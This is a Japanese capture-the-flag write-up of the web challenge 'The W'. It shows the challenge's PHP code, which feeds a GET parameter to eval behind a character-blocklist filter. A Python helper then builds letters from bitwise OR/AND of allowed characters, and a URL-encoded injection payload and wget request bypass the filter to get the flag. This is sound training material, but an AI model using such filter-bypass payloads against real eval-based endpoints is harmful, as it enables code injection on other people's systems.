# "The W":Web:15pts
Those Wutang Boys are at it again, hoot'n and holler'n and waking up the kids. I tried to put a stop to them but they are so damn clever. Just the other day I heard them yell "Wutang4Life" and they picked up and ran off with my flag... I tell ya, kids these days have it too easy...  
In Scope: http://web01.ctf313.com/  
Hack the web app only. You have the source code, no need to brute force or spam anything.  
Server and Infrastructure are out of scope and will result in an automatic ban and public shaming for being a 💩.  

# Solution
URLにアクセスするとphpソースが表示される。  
Web Challenge: "The W"  
[site.png](site/site.png)  
オレオレWAFを突破すれば良いようだ。  
WAFを詳しく見てやる。  
```php
function wutang_waf($str){

  for($i=0; $i<=strlen($str)-1; $i++) {

    if ((ord($str[$i])<32) or (ord($str[$i])>126)) {
      header("HTTP/1.1 416 Range Not Satisfiable");
      exit;
    }

  }

  $blklst = ['[A-VX-Za-z]',' ','\t','\r','\n','\'','""','`','\[','\]','\$','\\','\^','~'];
  foreach ($blklst as $blkitem) {
    if (preg_match('/' . $blkitem . '/m', $str)) {
      header("HTTP/1.1 403 Forbidden");
      exit;
    }
  }
}
```
`0123456789W!"#%&()*+,-./:;<=>?@_{|}`が通るようだ。  
`""`はブロックされるが、`"W"`のように文字を挟めばバイパスできる。  
ある程度の文字と`&`と`|`と`.`があるので、phpfuckの要領で任意の文字を構成できそうだ。  
以下を見ると、シェルをとるのではなく`Wutang4Life`をechoすれば良いようだ(バッファを見ている)。  
```php
if(!isset($_GET['yell'])) {
  show_source(__FILE__);
} else {
  $str = $_GET['yell'];
  wutang_waf($str);
  ob_start();
  $res = eval("echo " . $str . ";");
  $out = ob_get_contents();
  ob_end_clean();
  if ($out === "Wutang4Life") {
      echo $flag;
  } else {
    echo htmlspecialchars($out, ENT_QUOTES);
  }
}
```
`Wutang4Life`になる文字を組み立てればよい。  
以下のoreorephpf.pyを用いて必要な文字を抽出する。  
```python:oreorephpf.py
import sys

chars = '0123456789W!"#%&()*+,-./:;<=>?@_{|}'
new_chars = ""

if len(sys.argv) != 1:
    chars += sys.argv[1]


for i in chars:
    for j in chars:
        #And
        c = chr(ord(i) & ord(j))
        if (not c in chars) and (not c in new_chars) and (c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
            print("(\"{}\"%26\"{}\"):{}".format(i, j, c))
            new_chars += c
        #Or
        c = chr(ord(i) | ord(j))
        if (not c in chars) and (not c in new_chars) and (c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
            print("(\"{}\"%7C\"{}\"):{}".format(i, j, c))
            new_chars += c

print(new_chars)
```
実行する。  
```bash
$ python oreorephpf.py | grep :u
("5"%7C"@"):u
$ python oreorephpf.py | grep :t
("4"%7C"@"):t
$ python oreorephpf.py | grep :a
("!"%7C"@"):a
$ python oreorephpf.py | grep :n
("."%7C"@"):n
$ python oreorephpf.py | grep :g
$ python oreorephpf.py | grep :L
$ python oreorephpf.py | grep :i
(")"%7C"@"):i
$ python oreorephpf.py | grep :f
("&"%7C"@"):f
$ python oreorephpf.py | grep :e
("%"%7C"@"):e
$ python oreorephpf.py | grep -v :
wpqrstuvxySTUabcefhijklmnoz
$ python oreorephpf.py wpqrstuvxySTUabcefhijklmnoz | grep :g
("!"%7C"f"):g
$ python oreorephpf.py wpqrstuvxySTUabcefhijklmnoz | grep :L
("_"%26"l"):L
$ python oreorephpf.py wpqrstuvxySTUabcefhijklmnoz | grep :l
$ python oreorephpf.py | grep :l
(","%7C"@"):l
```
よってWAFを突破する文字列は以下のようになる。  
`&`を`%26`に置き換える必要がある。  
`("W").("5"%7C"@").("4"%7C"@").("!"%7C"@").("."%7C"@").("!"%7C("%26"%7C"@")).("4").("_"%26(","%7C"@")).(")"%7C"@").("%26"%7C"@").("%"%7C"@")`  
リクエストを投げる。  
```bash
$ wget -q -O - 'http://web01.ctf313.com/?yell=("W").("5"%7C"@").("4"%7C"@").("!"%7C"@").("."%7C"@").("!"%7C("%26"%7C"@")).("4").("_"%26(","%7C"@")).(")"%7C"@").("%26"%7C"@").("%"%7C"@")'
flag{Wu7an9-83-Wi23-wI7h-73H-8I72}
```
flagが得られた。  

## flag{Wu7an9-83-Wi23-wI7h-73H-8I72}